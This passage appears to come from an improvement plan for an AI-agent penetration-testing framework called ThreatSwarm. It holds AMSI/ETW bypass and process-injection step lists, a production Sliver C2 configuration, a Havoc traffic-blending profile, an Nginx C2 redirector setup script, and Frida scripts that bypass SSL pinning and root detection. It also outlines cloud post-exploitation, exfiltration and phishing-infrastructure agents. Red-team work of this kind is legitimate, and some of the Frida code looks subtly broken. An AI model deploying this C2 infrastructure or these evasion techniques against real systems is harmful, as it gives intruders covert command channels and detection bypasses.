| wmic.exe | T1047 WMI | High | Remote command execution |
| rundll32.exe | T1218.011 DLL | High | DLL export execution |

### Tier 2: Moderate Detection
| Binary | Technique | ATT&CK | Use Case |
|--------|-----------|--------|----------|
| msbuild.exe | T1127.001 MSBuild | AppLocker bypass via inline C# |
| installutil.exe | T1218.004 InstallUtil | AppLocker bypass |
| msxsl.exe | T1220 XSL Script | XSL stylesheet processing |
| diskshadow.exe | T1003 OS Credential Dump | Shadow copy access |
| tracker.exe | T1105 Download | OneDrive telemetry abuse |
| ssh.exe | T1021.004 SSH | Lateral movement |

### Tier 3: Lower Detection (more OPSEC-safe)
| Binary | Technique | ATT&CK | Use Case |
|--------|-----------|--------|----------|
| forfiles.exe | T1204.002 Exec | Scheduled file execution |
| dxcap.exe | T1218.013 DLL | DirectX capture tool abuse |
| ieexec.exe | T1218.007 IEExec | .NET assembly remote loading |
| tttracer.exe | T1218.015 tttracer | .NET tracing tool abuse |
| verclsid.exe | T1218.016 Verclsid | CLSID execution |
| SyncAppvPublishingServer.exe | T1218.020 AppV | PowerShell execution via AppV |
```

#### 2. AMSI Bypass — Expanded Techniques
```
## AMSI Bypass Techniques — Updated for 2025/2026

### Memory Patching (AmsiScanBuffer)
- [X] amsiInitFailed patch — Classic, widely detected
- [X] amsiContext byte overwrite — Common, many EDRs catch this
- [ ] amsi.dll base address + offset scan — Finds patch location dynamically
- [ ] Hardware breakpoint on AmsiScanBuffer — Bypasses IAT hooks
- [ ] AMSI via reflection context corruption — Advanced

### ETW Patching (Event Tracing for Windows)
- [ ] EtwEventWrite patch — Blocks EDR telemetry entirely
- [ ] Combined AMSI + ETW patch — Most effective combo
- [ ] Direct syscall to NtTraceEvent — Avoids userland hooks

### .NET Assembly Loading
- [ ] Execute-Assembly via CLR COM activation — No powershell.exe needed
- [ ] Assembly.Load from byte array in C# — In-memory only
- [ ] Unmanaged CLR hosting (C++ loader) — Most OPSEC-safe .NET execution

### COM Hijacking
- [ ] COM object hijacking for persistence + execution
- [ ] Scheduled task COM hijack — T1053.005
- [ ] Registry-based COM hijack — T1546.015
```

#### 3. Process Injection — Actionable Techniques
```
## Process Injection — Step-by-Step Methodology

### 1. Classic Remote Thread Injection
Target: Windows 10/11, any process with current user context
Tools: Custom C loader, Python ctypes
Steps:
1. OpenProcess with PROCESS_ALL_ACCESS
2. VirtualAllocEx (RWX memory region)
3. WriteProcessMemory (shellcode)
4. CreateRemoteThread (execution)
Detection: Sysmon EID 8 (CreateRemoteThread), EDR memory scanning
OPSEC Notes: RWX allocation is a major detection signal. Use RW→RX pattern.

### 2. Process Hollowing (Doppelgänging variant)
Target: Signed/legitimate process (explorer.exe, svchost.exe)
Tools: Custom C loader, sRDI (shellcode → reflective DLL)
Steps:
1. Create suspended process from legitimate binary
2. NtUnmapViewOfSection (hollow out)
3. VirtualAllocEx + WriteProcessMemory (inject payload)
4. SetThreadContext (fix entry point)
5. ResumeThread
Detection: Sysmon EID 1 (process creation with suspicious parent), hollowing heuristics

### 3. Early Bird APC Injection
Target: Any process that loads ntdll.dll
Tools: Custom C loader
Steps:
1. Create suspended process
2. QueueUserAPC with shellcode on main thread
3. ResumeThread (APC executes before main thread)
Detection: Sysmon EID 8, suspicious thread creation patterns

### 4. Module Stomping (DLL Hollowing)
Target: Signed DLL loaded into legitimate process
Steps:
1. Load a legitimate DLL into target process
2. Overwrite DLL's memory with payload
3. Execute from the DLL's base address
Detection: Lower than classic injection — DLL is signed and trusted

### 5. Syscall Stomping (Direct System Calls)
Target: Bypass userland API hooks
Tools: SysWhispers, SyscallStubs, FwdHook detection evasion
Steps:
1. Resolve syscall number dynamically (not hardcoded)
2. Execute syscall directly from .text segment
3. Avoid ntdll.dll entirely for sensitive operations
Detection: Very difficult — requires kernel callbacks or ETW
```

#### 4. Detection Gap Assessment Template
```
## Detection Gap Assessment Deliverable

After every engagement, the evasion agent MUST produce:

### Evasion Testing Report

| # | Technique | Category | ATT&CK | Tool/Method | Result | Detection Source | Alert? |
|---|-----------|----------|--------|-------------|--------|-----------------|--------|
| 1 | AMSI reflection patch | AMSI Bypass | T1562.001 | PowerShell | Detected | Defender AMSI | Yes (EID 1116) |
| 2 | ETW patch + .NET loader | ETW Bypass | T1562.001 | C# loader | NOT detected | — | No |
| 3 | Module stomping | Process Injection | T1055 | Custom C | Detected | Sysmon EID 8 | Yes |

### Detection Gaps Summary
| Gap | Severity | Recommended Sigma Rule | Recommended EDR Config |
|-----|----------|----------------------|----------------------|
| ETW patching undetected | HIGH | Monitor for NtTraceEvent modifications | Enable kernel ETW providers |
| Module stomping DLL loading | MEDIUM | Alert on DLL load from unusual paths | Enable DLL load tracking |

### OPSEC Recommendations for Client
[Specific, actionable recommendations for hardening detection capabilities]
```

### E.2 C2 Operator — Add Configuration Templates

**Current problems:**
- Sliver section is command reference only — no production-ready configuration
- Havoc section is minimal — mentions profiles but doesn't provide them
- No malleable C2 profile templates
- No redirector setup
- No domain fronting configuration
- No Let's Encrypt automation for C2 domains

**Improvements:**

#### Sliver Configuration Template
```yaml
# sliver-config.yaml — Production C2 server configuration
# Generate: sliver-server --config sliver-config.yaml

server:
  host: "0.0.0.0"
  port: 31337
  lhost: "$C2_DOMAIN"
  
listeners:
  mtls:
    enabled: true
    port: 8888
    cert: "/etc/letsencrypt/live/$C2_DOMAIN/fullchain.pem"
    key: "/etc/letsencrypt/live/$C2_DOMAIN/privkey.pem"
  
  https:
    enabled: true
    port: 443
    domain: "$C2_DOMAIN"
    cert: "/etc/letsencrypt/live/$C2_DOMAIN/fullchain.pem"
    key: "/etc/letsencrypt/live/$C2_DOMAIN/privkey.pem"
    # Malleable profile settings
    website:
      enabled: true
      content_type: "text/html"
      # Serve a clone of the legitimate site
      clone_url: "https://www.example.com"
  
  dns:
    enabled: true
    domain: "dns.$C2_DOMAIN"
    canaries: true

implants:
  windows:
    arch: "amd64"
    format: "exe"
    mtls: "$C2_DOMAIN:8888"
    https: "$C2_DOMAIN:443"
    dns: "dns.$C2_DOMAIN"
    # OPSEC settings
    skip_symbols: true
    debug: false
    sleeptime: 60       # seconds
    jitter: 30          # percent
    max_connections: 5
    reconnections: 10
  
  linux:
    arch: "amd64"
    format: "elf"
    mtls: "$C2_DOMAIN:8888"
    sleeptime: 60
    jitter: 30
```

#### Havoc Profile Template
```yaml
# havoc-profile.yaotl — Malleable C2 profile for Havoc
# Similar to Cobalt Strike malleable C2 profiles

profile:
  name: "ThreatSwarm-Blue"
  description: "Blends with enterprise blue team traffic"
  
  http:
    get:
      uri: [
        "/api/v2/updates",
        "/api/v2/config",
        "/api/v2/health",
        "/js/app.:[a-z0-9]{8}.js",
        "/css/style.:[a-z0-9]{8}.css"
      ]
      headers:
        User-Agent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
        Accept: "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8"
        Accept-Language: "en-US,en;q=0.9"
        Accept-Encoding: "gzip, deflate, br"
        Connection: "keep-alive"
    
    post:
      uri: [
        "/api/v2/telemetry",
        "/api/v2/events",
        "/api/v2/metrics",
        "/api/v2/beacon"
      ]
      headers:
        Content-Type: "application/octet-stream"
    
    server:
      header: "nginx"
      powered_by: false
  
  sleep:
    mask: true  # jitter
  
  jitter: 37
  
  kill_date: "2026-06-30"
```

#### Redirector Setup
```bash
#!/bin/bash
# redirector_setup.sh — Set up an Nginx redirector for C2
# Usage: ./redirector_setup.sh <c2_domain> <c2_backend_ip> <c2_backend_port>

C2_DOMAIN="$1"
C2_IP="$2"
C2_PORT="$3"
REDIR_IP="$4"  # Redirector public IP

# Install Nginx
apt update && apt install -y nginx certbot python3-certbot-nginx

# Configure redirector
cat > /etc/nginx/sites-available/c2-redir << EOF
server {
    listen 80;
    server_name $C2_DOMAIN;
    return 301 https://\$host\$request_uri;
}

server {
    listen 443 ssl http2;
    server_name $C2_DOMAIN;

    ssl_certificate /etc/letsencrypt/live/$C2_DOMAIN/fullchain.pem;
    ssl_certificate_key /etc/letsencrypt/live/$C2_DOMAIN/privkey.pem;
    
    ssl_protocols TLSv1.2 TLSv1.3;
    ssl_ciphers HIGH:!aNULL:!MD5;

    # Rate limiting (looks legitimate)
    limit_req_zone \$binary_remote_addr zone=c2:10m rate=10r/s;

    # C2 traffic routes
    location ~ ^/api/v2/ {
        limit_req zone=c2 burst=20 nodelay;
        proxy_pass http://$C2_IP:$C2_PORT;
        proxy_set_header Host \$host;
        proxy_set_header X-Real-IP \$remote_addr;
        proxy_set_header X-Forwarded-For \$proxy_add_x_forwarded_for;
    }

    # Everything else → legitimate site
    location / {
        root /var/www/html;
        try_files \$uri \$uri/ =404;
    }

    access_log /var/log/nginx/c2_access.log;
    error_log /var/log/nginx/c2_error.log;
}
EOF

# Enable and get cert
ln -sf /etc/nginx/sites-available/c2-redir /etc/nginx/sites-enabled/
certbot --nginx -d "$C2_DOMAIN" --non-interactive --agree-tos

nginx -t && systemctl restart nginx
echo "[+] Redirector ready: https://$C2_DOMAIN → http://$C2_IP:$C2_PORT"
```

### E.3 IoT Attacker — Add Firmware Analysis Methodology

**Current problems:**
- Basic firmware extraction (binwalk) but no structured analysis methodology
- Missing: firmware emulation, vulnerability research on embedded binaries, UART/JTAG walkthrough
- No MQTT/CoAP protocol testing methodology
- No OT/ICS safety considerations

**Improvements:**

#### Firmware Analysis Methodology
```
## Firmware Analysis Pipeline

### Phase 1: Acquisition
1. Identify firmware source (vendor download, device extraction, OTA update capture)
2. Record firmware metadata (device model, version, hash, source URL)
3. Verify firmware integrity (compare hash with vendor, detect tampering)

### Phase 2: Extraction
1. Run binwalk -Me firmware.bin → extract all embedded filesystems
2. Identify filesystem types: SquashFS, JFFS2, CramFS, YAFFS2, UBIFS
3. Extract from each layer until raw filesystem contents are visible
4. Check for encrypted/obfuscated firmware layers

### Phase 3: Static Analysis
1. Target identification:
   - Read /etc/passwd, /etc/shadow (default credentials)
   - Parse init scripts (/etc/init.d/*, /etc/rc.local)
   - Check crontabs for scheduled tasks
   - Examine web server configs (httpd.conf, nginx.conf, lighttpd.conf)
2. Binary analysis:
   - file * → identify binary architectures (ARM, MIPS, PowerPC)
   - Check for hardcoded credentials (strings | grep -i pass)
   - Identify running services and their versions
3. Web interface analysis:
   - Extract web files from filesystem
   - Check for common web vulns in embedded web servers
   - Look for authentication bypass in CGI handlers

### Phase 4: Emulation
1. Use QEMU to emulate extracted firmware:
   - ARM: qemu-system-arm -M vexpress-a9 -kernel vmlinux -drive file=rootfs.ext4
   - MIPS: qemu-system-mips -M malta -kernel vmlinux -drive file=rootfs.ext4
2. Use Firmadyne/FACT for automated emulation
3. If emulation fails, use cross-compilation for dynamic testing

### Phase 5: Vulnerability Research
1. Known CVEs for the device model/version
2. Check for default credentials in CPE database
3. Research known vulnerabilities in the software stack (BusyBox, web server, etc.)
4. Test for common IoT vulns: command injection, path traversal, authentication bypass

### Tools
- binwalk, firmware-mod-kit, FACT, Firmadyne
- QEMU (user-mode and system-mode)
- Ghidra (ARM/MIPS cross-analysis)
- mosquitto_sub/mosquitto_pub (MQTT testing)
- BACnet Explorer (BACnet testing)
```

### E.4 Wireless Attacker — Expand Methodology

**Current problems:**
- WPA2/WPA3 cracking covered but no PMKID/SAE transition attacks
- No BLE/Bluetooth Low Energy methodology
- No 802.11ax (Wi-Fi 6) considerations
- No wireless IDS/IPS evasion

**Improvements needed:**
- Add PMKID attack methodology (hcxdumptool → hashcat -m 22000)
- Add WPA3 SAE dictionary attack
- Add BLE enumeration (bettercap BLE module, gattacker)
- Add wireless IDS/IPS detection and evasion
- Add enterprise WPA (802.1X/EAP) attack methodology
- Add WiFi 6 (OFDMA, MU-MIMO) reconnaissance considerations

### E.5 Mobile Attacker — Add Frida Script Templates

**Current problems:**
- Mentions Frida but provides no scripts
- No certificate pinning bypass templates
- No root detection bypass scripts
- No Frida gadget injection methodology

**Improvements needed:**

#### Frida Script Templates
```javascript
// frida-bypass-ssl-pinning.js — Universal SSL pinning bypass
// Works on Android and iOS
Java.perform(function() {
    // Android: Bypass OkHttp, TrustManager, and WebView SSL pinning
    var TrustManager = Java.use('javax.net.ssl.X509TrustManager');
    var SSLContext = Java.use('javax.net.ssl.SSLContext');
    
    // Create a TrustManager that accepts all certificates
    var TrustManagerImpl = Java.registerClass({
        name: 'com.ThreatSwarm.TrustManager',
        implements: [TrustManager],
        methods: {
            checkClientTrusted: function(chain, authType) {},
            checkServerTrusted: function(chain, authType) {},
            getAcceptedIssuers: function() { return []; }
        }
    });
    
    // Override SSLContext.init() to use our TrustManager
    SSLContext.init.overload('[Ljavax.net.ssl.KeyManager;', '[Ljavax.net.ssl.TrustManager;', 'java.security.SecureRandom')
        .implementation = function(km, tm, sr) {
            this.init(km, [TrustManagerImpl.$new()], sr);
        };
    
    console.log('[+] SSL pinning bypassed');
});

// iOS: Bypass SecTrustEvaluateWithCompletion
if (ObjC.available) {
    var SecTrust = ObjC.classes.SecTrust;
    Interceptor.attach(SecTrust['- evaluateWithCompletionHandler:'].implementation, {
        onLeave: function(retval) {
            // Force result to kSecTrustResultUnspecified (trusted)
            retval.replace(0);
        }
    });
}
```

```javascript
// frida-root-detect-bypass.js — Bypass common root detection
Java.perform(function() {
    // Bypass Java root detection checks
    var File = Java.use('java.io.File');
    var Runtime = Java.use('java.lang.Runtime');
    
    // Common root indicator paths
    var rootPaths = [
        '/system/app/Superuser.apk',
        '/sbin/su',
        '/system/bin/su',
        '/system/xbin/su',
        '/data/local/xbin/su',
        '/data/local/bin/su',
        '/system/sd/xbin/su',
        '/system/bin/failsafe/su',
        '/data/local/su',
        '/su/bin/su',
        '/magisk/.core/bin/su'
    ];
    
    // Hook File.exists() for root paths
    rootPaths.forEach(function(path) {
        var file = File.$new(path);
        Interceptor.attach(File.exists.implementation, {
            onLeave: function(retval) {
                if (this.$l === path || (this.$l && this.$l.toString().indexOf(path) !== -1)) {
                    retval.replace(Java.use('java.lang.Boolean').FALSE.value);
                }
            }
        });
    });
    
    // Hook Runtime.exec() to detect root check commands
    Interceptor.attach(Runtime.exec.overload('[Ljava.lang.String;').implementation, {
        onEnter: function(args) {
            var cmd = Java.use('java.util.Arrays').toString(args[0]);
            if (cmd.indexOf('which su') !== -1 || 
                cmd.indexOf('su') !== -1 ||
                cmd.indexOf('busybox') !== -1) {
                console.log('[+] Blocked root check: ' + cmd);
                // Replace with harmless command
                args[0] = Java.use('java.util.Arrays').asList(['echo', 'not found']);
            }
        }
    });
    
    console.log('[+] Root detection bypassed');
});
```

### E.6 Report Writer — Add Templates

**Current state:** Already good. Add:
- Enterprise client template (for Ironcybersec's larger clients)
- SMB client template (simpler format)
- API security assessment template
- Mobile application assessment template
- Compliance assessment template (PCI-DSS, SOC 2)
- Red team assessment template

---

## F. New Agents to Add

### F.1 Vulnerability Management Agent (`core/agents/vuln-management.md`)

**Purpose:** End-to-end vulnerability management lifecycle — scanning, prioritization, remediation tracking, and retesting. Bridges gap between pentest findings and ongoing security operations.

**Triggers:** vulnerability management, vuln lifecycle, remediation tracking, patch management, CVSS prioritization, vulnerability scan, Nessus, Qualys, InsightVM

**Tools:** Bash, Read, Write, Glob

**Key Capabilities:**
1. **Scanner Integration:**
   - Nessus CLI: `nessuscli scan new`, `nessuscli scan results`
   - Qualys API: scan launch, results fetch, vulnerability export
   - Nuclei: template-based vulnerability scanning with custom templates
   - OpenVAS: CLI-based scanning and reporting
   
2. **Prioritization Engine:**
   - CVSS v3.1 scoring with environmental metrics
   - EPSS (Exploit Prediction Scoring System) integration
   - CISA KEV catalog cross-reference
   - Business context weighting (internet-facing > internal)
   - Asset criticality scoring
   
3. **Remediation Tracking:**
   - Findings database (SQLite or JSON files)
   - Status tracking: New → In Progress → Remediated → Verified → Closed
   - SLA enforcement: Critical: 24h, High: 7d, Medium: 30d, Low: 90d
   - Remediation ticket generation (OpenProject integration)
   
4. **Retest Workflow:**
   - Automated re-scan for remediated findings
   - Before/after evidence comparison
   - Status update and notification

**Sample Workflow:**
```
/vuln-mgmt scan 10.10.10.0/24 nessus
/vuln-mgmt prioritize --epss --kev
/vuln-mgmt track --add "CVE-2024-3400" --severity critical --owner "infra-team"
/vuln-mgmt retest CVE-2024-3400 --evidence evidence/20260430/
/vuln-mgmt report --format json --output vulns_report.json
```

### F.2 Purple Team Agent (`core/agents/purple-team.md`)

**Purpose:** MITRE ATT&CK-based adversary emulation, detection validation, and detection engineering. Collaborates with both offensive and defensive teams.

**Triggers:** purple team, adversary emulation, ATT&CK emulation, detection validation, detection engineering, atomic red team, CAR

**Tools:** Bash, Read, Write, Glob

**Key Capabilities:**
1. **ATT&CK Emulation Plans:**
   - Pre-built emulation plans based on common threat actors (APT29, APT28, FIN7, etc.)
   - Custom emulation plan builder from ATT&CK technique selection
   - Atomic Red Team integration for individual technique execution
   - Caldera integration for automated adversary emulation
   
2. **Detection Validation:**
   - Execute offensive technique → verify detection alert generated
   - Log collection and analysis to confirm detection
   - Detection coverage mapping (which TTPs are covered vs. gaps)
   - Detection rule testing against Sigma rules
   
3. **Detection Engineering:**
   - Sigma rule generation from ATT&CK techniques
   - Sysmon configuration recommendations
   - SIEM query development (Splunk SPL, Elastic KQL, Sentinel KQL)
   - Detection as Code (DaC) pipeline support
   
4. **Reporting:**
   - ATT&CK Navigator layer generation (coverage heatmap)
   - Detection gap analysis report
   - Improvement roadmap based on detected gaps

**Emulation Plan Template:**
```markdown
## Purple Team Emulation Plan — [Engagement Name]

### Objective
Validate detection coverage for [threat scenario].

### ATT&CK Techniques
| Technique | Tactic | Test Method | Expected Detection | Status |
|-----------|--------|-------------|-------------------|--------|
| T1566.001 | Initial Access | Spear-phishing attachment | Email gateway alert | NOT TESTED |
| T1059.001 | Execution | PowerShell download cradle | AMSI/Sysmon EID 412 | NOT TESTED |
| T1003.001 | Credential Access | LSASS memory dump | Sysmon EID 10 | NOT TESTED |
| T1087.002 | Discovery | Domain user enumeration | Security log 4768/4769 | NOT TESTED |
| T1021.002 | Lateral Movement | SMB lateral movement | SMB log, EDR alert | NOT TESTED |

### Results Summary
- Techniques Tested: X
- Detected: Y (Z%)
- Detection Gaps: [list]
```

### F.3 Cloud Post-Exploitation Agent (`core/agents/cloud-postex.md`)

**Purpose:** Specialized post-exploitation for cloud environments (AWS, Azure, GCP). Persistence, data exfiltration, privilege escalation within cloud-native architectures.

**Triggers:** cloud post-ex, cloud persistence, AWS privesc, Azure privesc, GCP privesc, cloud data exfil, IAM abuse, cloud lateral movement

**Tools:** Bash, Read, Write

**Key Capabilities:**

#### AWS Post-Exploitation
1. **Persistence Mechanisms:**
   - IAM user creation with access keys
   - Lambda backdoor (web shell via API Gateway)
   - CloudFormation stack creation (stealthy persistence)
   - EC2 user-data scripts (survives reboots)
   - S3 bucket policy modification (data exfil channel)
   - Glue job backdoor (scheduled code execution)
   - Organizations SCP manipulation
   
2. **Data Exfiltration:**
   - S3 bucket enumeration and data download
   - RDS snapshot export to attacker account
   - Secrets Manager / SSM Parameter Store extraction
   - CloudTrail log analysis (to understand what's monitored)
   - VPC Flow Logs analysis (to map network traffic)
   
3. **Lateral Movement:**
   - AssumeRole chain exploitation
   - EC2 instance metadata SSRF (IMDSv1 bypass)
   - Lambda execution role abuse
   - EKS kubeconfig extraction
   - CodeBuild/CodePipeline credential extraction

#### Azure Post-Exploitation
1. **Persistence:**
   - Service principal creation with Contributor role
   - Azure AD app registration with admin consent
   - Automation account runbook backdoor
   - VM extension deployment (Custom Script Extension)
   - Azure Functions backdoor
   
2. **Data Exfiltration:**
   - Storage account enumeration (blob, file, table, queue)
   - Key Vault secret extraction
   - Azure SQL database export
   - Managed identity token harvesting

#### GCP Post-Exploitation
1. **Persistence:**
   - Service account key creation
   - GKE workload identity abuse
   - Cloud Functions backdoor
   - Compute instance startup scripts
   
2. **Data Exfiltration:**
   - GCS bucket enumeration and download
   - Cloud SQL export
   - Secret Manager access
   - BigQuery data extraction

### F.4 Network Segmentation Testing Agent (`core/agents/segmentation-tester.md`)

**Purpose:** Test network segmentation, firewall rules, VLAN isolation, and zero-trust implementations. Validate that network boundaries actually contain breaches.

**Triggers:** segmentation test, firewall test, VLAN hopping, network isolation, zero-trust validation, lateral movement prevention, network boundary

**Tools:** Bash, Read, Write

**Key Capabilities:**
1. **Firewall Rule Analysis:**
   - Import firewall configs (pfSense, MikroTik, Palo Alto, iptables, AWS Security Groups)
   - Parse and visualize rule sets
   - Identify overly permissive rules
   - Detect rule ordering issues
   - Test actual enforcement vs. configured rules
   
2. **VLAN Hopping:**
   - Double tagging (802.1Q) attack testing
   - VLAN trunk port misconfiguration detection
   - Dynamic Trunking Protocol (DTP) abuse
   - Switch spoofing
   
3. **Network Boundary Validation:**
   - Confirm segmentation between zones (DMZ, internal, restricted, management)
   - Test east-west traffic filtering
   - Verify micro-segmentation (Kubernetes network policies, VMware NSX)
   - Validate zero-trust architecture assumptions
   
4. **Tools Integration:**
   - NetExec (vsh00t/NetExec fork) for SMB/WinRM/LDAP boundary testing
   - Nmap for port scanning across VLANs
   - tshark/tcpdump for traffic analysis
   - hping3 for firewall rule validation

### F.5 Red Team Infrastructure Agent (`core/agents/red-infra.md`)

**Purpose:** Set up and manage full red team infrastructure — domains, redirectors, phishing, payload delivery, and infrastructure OPSEC.

**Triggers:** red team infra, redirector, domain fronting, phishing infra, C2 setup, red team lab, infrastructure OPSEC

**Tools:** Bash, Read, Write

**Key Capabilities:**
1. **Domain Portfolio Management:**
   - Domain acquisition guidance (age, TLD, registrant privacy)
   - Domain categorization (CDN frontable, clean reputation)
   - Let's Encrypt automation for all domains
   - DNS configuration templates
   
2. **Redirector Chain:**
   - Single redirector → C2 setup
   - Multi-hop redirector chains (2-3 hops)
   - Domain fronting via CDNs (CloudFront, Azure CDN, Akamai)
   - Redirector health monitoring
   
3. **Phishing Infrastructure:**
   - GoPhish deployment and configuration
   - Landing page templates (O365, Google, SSO)
   - Credential harvester setup
   - Evilginx2 adversary-in-the-middle phishing
   
4. **Infrastructure OPSEC:**
   - Domain registration OPSEC (WHOIS privacy, registrant separation)
   - SSL certificate management
   - Infrastructure compartmentalization
   - Burn-down procedures (engagement cleanup)

---

## G. Tool Integration

### G.1 Replace CrackMapExec with NetExec

**Change:** All references to `crackmapexec` (CME) should use `netexec` (NXC) instead.

**Rationale:** Jorge maintains the `vsh00t/NetExec` fork. NetExec is the actively maintained successor to CrackMapExec.

**Files to update:**
- `CLAUDE.md` — Tool Paths table
- `.claude/settings.json` — permissions: `Bash(crackmapexec *)` → `Bash(netexec *)`
- `.claude/agents/active-directory.md` — All CME commands
- `.claude/agents/post-ex.md` — Lateral movement commands
- `.claude/agents/network-ops.md` — SMB relay commands
- `.claude/agents/password-attacks.md` — Password spraying commands
- `.claude/skills/ad-attacks/SKILL.md` — AD attack commands
- `core/hooks/scope_check.py` — `is_network_command()` regex: `crackmapexec` → `netexec`
- `CLAUDE.md` — Agent Delegation Table
- `README.md` — Agent table
- `scripts/batch_recon.sh` — No change needed (doesn't use CME)

**Command mapping:**
| Old (CME) | New (NXC) |
|-----------|-----------|
| `crackmapexec smb $TARGET` | `netexec smb $TARGET` |
| `crackmapexec smb $TARGET --laps` | `netexec smb $TARGET --laps` |
| `crackmapexec smb $TARGET -u user -p pass` | `netexec smb $TARGET -u user -p pass` |
| `crackmapexec smb $SUBNET --gen-relay-list` | `netexec smb $SUBNET --gen-relay-list` |

### G.2 MCP Server Integration

Create three MCP servers for OpenClaw/MCP-compatible agents:

#### scope-mcp (`integrations/mcp/scope-mcp/server.py`)
```python
"""MCP server for scope validation."""
# Tools:
# 1. scope_check(command: str) → {in_scope: bool, target: str, match: str}
# 2. scope_add(target: str, note?: str) → {added: bool, entries: list}
# 3. scope_remove(target: str) → {removed: bool}
# 4. scope_list() → {entries: list, total: int}
# 5. scope_validate() → {valid: bool, errors: list}
# 6. scope_status() → {engagement: dict, window: dict}
```

#### evidence-mcp (`integrations/mcp/evidence-mcp/server.py`)
```python
"""MCP server for evidence management."""
# Tools:
# 1. evidence_capture(target: str, type: str, data: str) → {path: str, hash: str}
# 2. evidence_list(target: str?, date?: str) → {files: list}
# 3. evidence_verify(target: str?) → {verified: list, tampered: list}
# 4. evidence_export(target: str, format: str) → {path: str}
# 5. finding_add(finding: Finding) → {id: str, severity: str}
# 6. finding_list(severity?: str, target?: str) → {findings: list}
# 7. finding_summary() → {total: int, by_severity: dict}
```

#### report-mcp (`integrations/mcp/report-mcp/server.py`)
```python
"""MCP server for report generation."""
# Tools:
# 1. report_generate(name: str, evidence_dir: str, template?: str) → {path: str, pages: int}
# 2. report_export(path: str, format: str) → {path: str}
# 3. report_quality_check(path: str) → {issues: list, score: float}
# 4. report_template_list() → {templates: list}
```

### G.3 n8n Workflow Integration

Create n8n workflow templates for automation:

#### engagement-start workflow
Triggers: Webhook (or manual)
Actions:
1. Create engagement directory structure
2. Initialize scope.txt
3. Send notification via Telegram
4. Create OpenProject task
5. Start batch recon script

#### finding-sync workflow
Triggers: Cron (every 30 min)
Actions:
1. Read evidence/ directory for new findings
2. Parse CRITICAL/HIGH findings
3. Send Telegram notification with summary
4. Update OpenProject task status
5. Append to findings summary

#### report-notification workflow
Triggers: Webhook (after report generation)
Actions:
1. Read generated report
2. Extract executive summary
3. Generate PDF
4. Send via Telegram with file attachment
5. Create OpenProject deliverable

### G.4 OpenProject Integration

```python
# integrations/openproject/sync.py
"""Sync ThreatSwarm engagements with OpenProject."""

OPENPROJECT_URL = "https://projects.ironcybersec.com"
OPENPROJECT_API_KEY = os.environ.get("OPENPROJECT_API_KEY", "")

def create_engagement(name: str, client: str, start_date: str, end_date: str) -> dict:
    """Create a project in OpenProject for the engagement."""
    
def create_finding_task(project_id: int, finding: dict) -> dict:
    """Create a work package for a finding."""
    
def update_finding_status(work_package_id: int, status: str) -> dict:
    """Update finding remediation status."""
    
def get_engagement_tasks(project_id: int) -> list:
    """List all work packages for an engagement."""
```

---

## H. Report Generation Pipeline

### H.1 Automated Report Generator

Create `core/scripts/report_generate.py`:

```python
#!/usr/bin/env python3
"""
Automated pentest report generator.
Reads evidence/ directory and generates professional reports.
"""

from pathlib import Path
from datetime import datetime, timezone
import json, re

class ReportGenerator:
    def __init__(self, evidence_dir: str, template: str = "default"):
        self.evidence_dir = Path(evidence_dir)
        self.template = template
        self.findings = []
        self.metadata = {}
    
    def discover_evidence(self):
        """Walk evidence/ directory and discover all findings."""
        # Find all findings.md, *_findings.md, *_report.md files
        # Parse structured finding entries
        # Build findings list with: target, severity, CVSS, description, evidence_path
        pass
    
    def score_findings(self):
        """Auto-score findings without CVSS based on type."""
        # Map finding types to default CVSS scores
        # e.g., "SQL injection" → CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N = 8.1
        pass
    
    def deduplicate_findings(self):
        """Merge overlapping findings across targets."""
        pass
    
    def generate_executive_summary(self) -> str:
        """Generate 1-page executive summary from findings."""
        pass
    
    def generate_technical_findings(self) -> str:
        """Generate detailed technical findings section."""
        pass
    
    def generate_remediation_roadmap(self) -> str:
        """Generate 30/60/90 day remediation roadmap."""
        pass
    
    def generate_report(self, output_format: str = "markdown") -> str:
        """Generate full report in specified format."""
        self.discover_evidence()
        self.deduplicate_findings()
        
        if output_format == "markdown":
            return self._render_markdown()
        elif output_format == "html":
            return self._render_html()
        elif output_format == "pdf":
            return self._render_pdf()
        elif output_format == "docx":
            return self._render_docx()
    
    def quality_check(self) -> dict:
        """Validate report quality: missing fields, placeholder text, credential leaks."""
        pass
```

### H.2 Report Templates

```
core/templates/
├── default/                     # Standard pentest report
│   ├── cover.md
│   ├── executive_summary.md
│   ├── finding_detail.md
│   ├── remediation_roadmap.md
│   └── appendix.md
├── enterprise/                  # Enterprise client template
│   ├── cover.md
│   ├── executive_summary.md
│   ├── finding_detail.md
│   ├── risk_matrix.md
│   ├── remediation_roadmap.md
│   ├── compliance_mapping.md
│   └── appendix.md
├── api-security/                # API security assessment
│   ├── cover.md
│   ├── executive_summary.md
│   ├── api_endpoint_inventory.md
│   ├── finding_detail.md
│   └── appendix.md
├── mobile-security/             # Mobile app assessment
│   ├── cover.md
│   ├── executive_summary.md
│   ├── finding_detail.md
│   ├── owasp-mastg-mapping.md
│   └── appendix.md
├── red-team/                    # Red team assessment
│   ├── cover.md
│   ├── executive_summary.md
│   ├── kill_chain.md
│   ├── finding_detail.md
│   ├── timeline.md
│   └── appendix.md
└── compliance/                  # Compliance assessment
    ├── cover.md
    ├── executive_summary.md
    ├── compliance_matrix.md
    ├── finding_detail.md
    └── appendix.md
```

### H.3 Output Formats

| Format | Tool Required | Use Case |
|--------|--------------|----------|
| Markdown | None (built-in) | Default, version-controlled |
| HTML | Built-in (Jinja2) | Client portal, web viewing |
| PDF | wkhtmltopdf or weasyprint | Final delivery to client |
| DOCX | python-docx | Client editing, branding |
| SARIF | Built-in (JSON) | CI/CD integration, GitHub Code Scanning |

### H.4 Quality Checks

The `quality_check()` method validates:

```python
def quality_check(self, report_content: str) -> dict:
    issues = []
    
    # Check for placeholder text
    placeholders = re.findall(r'\[PLACEHOLDER\]|\[TODO\]|\[FIXME\]|\[INSERT\]|\[TBD\]', report_content)
    if placeholders:
        issues.append({"severity": "critical", "message": f"Placeholder text found: {placeholders}"})
    
    # Check for credential leaks
    credential_patterns = [
        r'password\s*=\s*["\'][^"\']{4,}',
        r'Bearer [A-Za-z0-9\-_]+\.[A-Za-z0-9\-_]+',
        r'[0-9a-f]{32}:[0-9a-f]{32}',  # NTLM hash
        r'-----BEGIN (RSA |EC |DSA )?PRIVATE KEY-----',
    ]
